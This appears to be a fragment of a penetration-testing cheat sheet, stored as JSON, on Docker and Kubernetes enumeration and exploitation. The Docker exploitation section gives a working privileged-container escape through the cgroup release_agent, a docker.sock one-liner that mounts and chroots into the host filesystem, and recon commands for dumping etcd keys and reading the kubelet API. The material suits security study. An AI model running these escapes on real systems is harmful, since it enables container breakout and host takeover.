    "sections": [
        {
            "heading": "Docker Security & Enumeration",
            "subheadings": [
                {
                    "heading": "Core Concepts",
                    "type": "list",
                    "content": [
                        "**Docker Image**: Read-only template with OS, libraries, and apps.",
                        "**Docker Container**: Stateful, writable instance of an image.",
                        "**Dockerfile**: Instructions for building images.",
                        "**Capabilities**: Fine-grained access control (e.g., `net_bind_service`).",
                        "**Control Groups (cgroups)**: Resource allocation (CPU, memory) for containers."
                    ]
                },
                {
                    "heading": "Essential Commands",
                    "type": "code_block",
                    "content": [
                        "docker ps -a                # List all containers",
                        "docker images               # List available images",
                        "docker inspect <name>       # Low-level object information",
                        "docker history <image>      # Image layer history",
                        "docker exec -it <name> sh   # Access container shell",
                        "docker logs -f <name>       # Stream container logs"
                    ]
                },
                {
                    "heading": "Container Detection",
                    "type": "list",
                    "content": [
                        "Check for Docker MAC address range: `02:42:ac:11:00:00` to `02:42:ac:11:ff:ff`",
                        "Inspect CGROUPs: `cat /proc/1/cgroup` (should show docker process)",
                        "Look for `/.dockerenv` file or `docker.sock` in `/var/run/`",
                        "Check for limited process count: `ps aux` showing very few PIDs"
                    ]
                }
            ]
        },
        {
            "heading": "Docker Exploitation Techniques",
            "subheadings": [
                {
                    "heading": "Privileged Container & Capabilities Escape",
                    "type": "code_block",
                    "content": [
                        "# Check if privileged (CapEff: 0000003fffffffff)",
                        "cat /proc/self/status | grep CapEff",
                        "",
                        "# Escape via SYS_ADMIN (notify_on_release)",
                        "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x",
                        "echo 1 > /tmp/cgrp/x/notify_on_release",
                        "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
                        "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent",
                        "echo '#!/bin/sh' > /cmd",
                        "echo \"ps aux > $host_path/output\" >> /cmd",
                        "chmod a+x /cmd",
                        "sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
                    ]
                },
                {
                    "heading": "Docker Socket Abuse",
                    "type": "code_block",
                    "content": [
                        "# Check for exposed docker.sock",
                        "ls -la /var/run/docker.sock",
                        "",
                        "# Use socket to run a privileged host-mounting container",
                        "docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host"
                    ]
                }
            ]
        },
        {
            "heading": "Kubernetes Architecture & Recon",
            "subheadings": [
                {
                    "heading": "Kubernetes Objects",
                    "type": "list",
                    "content": [
                        "**Pods**: Smallest unit; group of one or more containers sharing network/storage.",
                        "**Services**: Abstraction to expose an application running on a set of Pods.",
                        "**Kubelet**: Agent running on each node to interact with the API.",
                        "**etcd**: Distributed key-value store for all cluster data."
                    ]
                },
                {
                    "heading": "Kubernetes CLI (kubectl)",
                    "type": "code_block",
                    "content": [
                        "kubectl cluster-info        # Get cluster status",
                        "kubectl get pods -A         # List all pods in all namespaces",
                        "kubectl describe pod <name> # Detailed pod information",
                        "kubectl get secrets         # List secrets",
                        "kubectl auth can-i --list   # Check current permissions"
                    ]
                },
                {
                    "heading": "External Reconnaissance",
                    "type": "list",
                    "content": [
                        "Search for `k8s.target.tld` subdomains",
                        "Check for exposed etcd on port 2379: `etcdctl --endpoints=http://<IP>:2379 get / --keys-only`",
                        "Inspect read-only Kubelet API on port 10255: `http://<node-IP>:10255/pods`"
                    ]
                }
            ]
        },
        {
            "heading": "Kubernetes Infrastructure Maps",
            "type": "image",
            "src": "/gitbook/assets/image (40).png",
            "caption": "Common Kubernetes Network Ports and Service Layout"
        },
        {
            "type": "image",
